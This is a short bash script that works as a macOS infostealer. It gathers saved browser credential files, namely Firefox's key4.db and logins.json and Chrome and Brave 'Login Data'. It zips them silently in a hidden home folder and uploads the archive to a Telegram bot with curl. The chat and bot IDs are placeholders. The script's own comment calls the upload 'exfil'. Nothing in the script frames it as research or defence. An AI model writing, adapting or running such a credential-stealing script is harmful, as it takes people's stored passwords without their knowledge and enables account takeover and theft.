#!/bin/bash

cd ~/.hidden/

# function to expand ~ to the home directory
expand_path() {
    local path=$1
    echo "$(eval echo "$path")"
}

# array of file paths to check and zip
files_to_check=("~/Library/Application\ Support/Firefox/Profiles/*.default-release/key4.db" "~/Library/Application\ Support/Firefox/Profiles/*.default-release/logins.json" "~/Library/Application\ Support/Google/Chrome/Profile*/Login\ Data" "~/Library/Application\ Support/BraveSoftware/Brave-Browser/Default/Login\ Data")

# array to hold existing files
existing_files=()

# check if each file exists and add it to the array if it does
for file in "${files_to_check[@]}"; do
    expanded_file=$(expand_path "$file")
    if [ -f "$expanded_file" ]; then
        existing_files+=("$expanded_file")
    fi
done

# zip the files if the array is not empty
if [ ${#existing_files[@]} -gt 0 ]; then
    zip -u data.zip "${existing_files[@]}" &>/dev/null
fi

# exfil data to telegram
curl -F "chat_id=<your_chat_id>" -F document=@data.zip https://api.telegram.org/bot<your_bot_id>/sendDocument
